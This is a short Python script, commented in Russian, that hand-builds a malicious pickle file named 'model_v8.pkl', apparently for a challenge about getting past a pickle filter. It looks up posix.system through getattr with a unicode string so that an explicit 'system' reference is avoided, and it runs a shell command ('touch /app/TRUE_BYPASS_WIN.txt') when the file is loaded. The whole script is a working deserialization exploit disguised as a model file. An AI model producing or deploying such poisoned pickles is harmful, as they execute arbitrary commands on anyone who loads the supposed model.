# Техника: Динамический поиск атрибута (getattr)
# Мы вызываем getattr(posix, "sys" + "tem")

payload = (
    b"cbuiltins\ngetattr\n"    # Импортируем функцию getattr
    b"(cposix\n_exit\n"         # Импортируем модуль posix (и любую мелкую функцию из него)
    b"Vsystem\n"                # Вместо явного S'system' используем UNICODE-строку (V)
    b"tR"                       # Вызываем getattr(posix, "system") -> получаем объект функции
    b"(S'touch /app/TRUE_BYPASS_WIN.txt'\n" # Аргумент для нашей функции
    b"tR."                      # Финальный вызов и STOP
)

with open('model_v8.pkl', 'wb') as f:
    f.write(payload)

print("Модель 'model_v8.pkl' (True Bypass) создана!")
